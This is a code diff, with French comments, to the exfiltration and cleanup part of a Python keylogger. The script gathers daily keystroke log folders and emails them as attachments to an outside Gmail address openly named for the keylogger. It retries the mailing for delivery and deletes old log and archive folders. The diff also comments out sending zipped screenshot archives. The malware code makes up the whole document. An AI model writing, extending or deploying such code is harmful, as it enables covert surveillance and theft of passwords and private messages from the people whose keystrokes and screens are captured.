@@ -37,17 +37,12 @@ def email_alert(subject,body,to, liste_file=""):
     ok = True
     for filename in liste_file:
         if os.path.exists(filename):
-            if filename[-4:] != ".zip":
-                attachment = open(filename,"rb")
-                part = MIMEBase('application','octet-stream')
-                part.set_payload((attachment).read())
-                encoders.encode_base64(part)
-                part.add_header('Content-Disposition','attachment; filename=' + filename)
-                msg.attach(part)
-            else: #si fichier zip
-                with open(filename,'rb') as f:
-				 # Attach the file with filename to the email
-                     msg.attach(MIMEApplication(f.read(), Name=filename.split('/')[-1]))
+            attachment = open(filename,"rb")
+            part = MIMEBase('application','octet-stream')
+            part.set_payload((attachment).read())
+            encoders.encode_base64(part)
+            part.add_header('content-disposition','attachment; filename=' + filename)
+            msg.attach(part)
         else:
             ok = False
             print(filename + " : file not exist")
@@ -75,15 +70,13 @@ def send_log_dossier(dateee):
 		if not os.path.exists(dossierhier +"/ok_sent.txt"): # si dans le dossier n'a pas été envoyé
 			listefichiers = [f"{dossierhier}/{nomfile_hier}"] #le fichier log à envoyé
 			
-			colis = AR1 + "/" + dateee + ".zip"		#l'archive de photo à envoyé
-			if os.path.exists(colis):
-				print("colis",colis)
-				listefichiers.append(colis)
-			try:
-				ok = email_alert(nomfile_hier,"yes","KeyLoggerVeski@gmail.com",listefichiers)
-			except:
-				ok = False
-				print(listefichiers, "n'a pas été envoyé, erreur d'essai")
+			#colis = AR1 + "/" + dateee + ".zip"		#l'archive de photo à envoyé
+			#if os.path.exists(colis):
+			#	print("colis",colis)
+			#	listefichiers.append(colis)
+			
+			ok = email_alert(nomfile_hier,"yes","KeyLoggerVeski@gmail.com",listefichiers)
+			
 			
 			#ok c'est fait, c'est noté
 			if ok:
@@ -96,14 +89,12 @@ def send_log_dossier(dateee):
 			
 def main_email():
 	
-	
-	for dos in os.listdir(NOM_DOSSIER_SECRET): #pour tous les dossier du data
-		if dos != dateajd and os.path.isdir(NOM_DOSSIER_SECRET + "/"+dos):
-			send_log_dossier(dos)
-			
-		else:
-			print(f" ! {dos} pas envoyé")				
-	print("*fin main_mail*")
+    for dos in os.listdir(NOM_DOSSIER_SECRET): #pour tous les dossier du data
+        if dos != dateajd and os.path.isdir(NOM_DOSSIER_SECRET + "/"+dos):
+            send_log_dossier(dos)	
+        else:
+             print(f" ! {dos} pas envoyé")	
+    print("*fin main_mail*")
 ###########################################################
      ################### DELETE ######################
 ###########################################################
@@ -134,20 +125,11 @@ def remove_file(path):
 		print(f"Unable to delete the {path}")
 	print("***")
 
-def get_file_or_folder_age(path):
-
-	# getting ctime of the file/folder
-	# time will be in seconds
-	ctime = os.stat(path).st_ctime
-
-	# returning the time
-	return ctime
-
 def main_delete(maximum):
 	global NOM_DOSSIER_SECRET
 	listeDossiersDates = [fic for fic in os.listdir(NOM_DOSSIER_SECRET)]
 	listeDossiersDates.sort()
-	print(listeDossiersDates)
+	print(" Dossiers presents ",listeDossiersDates)
 	listeDossiersSupprimer = []
 	n = len(listeDossiersDates)
 	cpt = 0
@@ -159,7 +141,7 @@ def main_delete(maximum):
 		listeDossiersDates = listeDossiersDates[1:]
 		n = len(listeDossiersDates)
 		cpt += 1
-	print(" Dossier supprimer",listeDossiersSupprimer)
+	print(" Dossiers supprimer",listeDossiersSupprimer)
 	print(" compteur affiche ",cpt)
 
 def main_delete_ar1(maximum):
@@ -180,88 +162,35 @@ def main_delete_ar1(maximum):
 	print(" AR1 supprimer",listeDossiersSupprimer)
 
 ###########################################################
-     ################### archives ######################
+     ################### MZIN ######################
 ###########################################################	
-'''
-import zipfile
+def TRY_MAIL(n,att):
+    if n > 0:
+        try:
+        	main_email()
+        	print(" ----------------------------------------> Yes main_email")
+        except:
+            print(" ----------------------------------------! ERREUR de main_email")
+            time.sleep(att)
+            TRY_MAIL(n-1,att)
+            
+def TRY_DELETE(n,att):
+    if n > 0:
+        try:
+            main_delete(3)
+            main_delete_ar1(20)
+            print(" ----------------------------------------> Yes main_delete et main_delete_arc")
+        except:
+            print(" ----------------------------------------! ERREUR de main_delete ou main_delete_arc")
+            time.sleep(att)
+            TRY_DELETE(n-1,att)            
+    
+TRY_DELETE(2,15)
 
+print("...")
+time.sleep(10)
 
-def go_zip_directory(dossierDate):
-	
-	nomduZip = AR1 + "/" + dossierDate.split("/")[-1] + ".zip"
-	
-	if not os.path.exists(nomduZip):
-		mode = "w"
-	else:
-		mode = "a"
-	
-	print(" ~~~",dossierDate)	
-	with zipfile.ZipFile(nomduZip,mode) as my_zip:
-		dossierDate += "/screens"
-		#
-		#print(elems,my_zip.namelist())
-		if os.path.exists(dossierDate):
-			for img in os.listdir(dossierDate):
-				my_zip.write(dossierDate + "/" + img)
-				print(" ",img)
-
-				
-
-
-def ranger_zips():
-	listezips = [fic for fic in os.listdir(NOM_DOSSIER_SECRET) if fic[-4:] == ".zip"]
-	print(listezips)
-	if len(listezips) > 0:
-		 # le dossier archives
-		if not os.path.exists(ARCHIVEGANG):
-			os.makedirs(ARCHIVEGANG)
-			
-		for dos in listezips: #deplacer chaquer element dans le dossier archives
-			origine = NOM_DOSSIER_SECRET +"/"+ dos
-			destination = ARCHIVEGANG + "/"+ dos
-			shutil.move(origine, destination)
-	
-	print("*rangerzips*")
-def main_archive():
-	#ranger_zips()
-	for dos in os.listdir(NOM_DOSSIER_SECRET):	
-		if os.path.isdir(NOM_DOSSIER_SECRET + "/"+dos): # c un dossier mgl
-			if dos != dateajd or 1:
-				go_zip_directory(NOM_DOSSIER_SECRET + "/"+ dos) #ziper le dossier
-			else:
-				print(f" veski * dossier de ajd {dos}")	
-		else:
-			print(f" veski * pas un dossier {dos}")	
-	#ranger_zips()			
-
-try:
-	
-	
-	print(" ----------------------------------------> Yes main_archive")
-except:
-	print(" ----------------------------------------! ERREUR de main_archive")
-	
-main_archive()
-############################################################################## MAIN
-'''
-'''
-try:
-	
-	print(" ----------------------------------------> Yes main_email")
-except:
-	print(" ----------------------------------------! ERREUR de main_email")
-'''
-main_email()
-try:
-	main_delete(3)
-	print(" ----------------------------------------> Yes main_delete")
-except:
-	print(" ----------------------------------------! ERREUR de main_delete")
-try:
-	main_delete_ar1(20)
-	print(" ----------------------------------------> Yes main_delete_ar1")
-except:
-	print(" ----------------------------------------! ERREUR de main_delete_ar1")
+TRY_MAIL(5,(60*10))
 
 
 
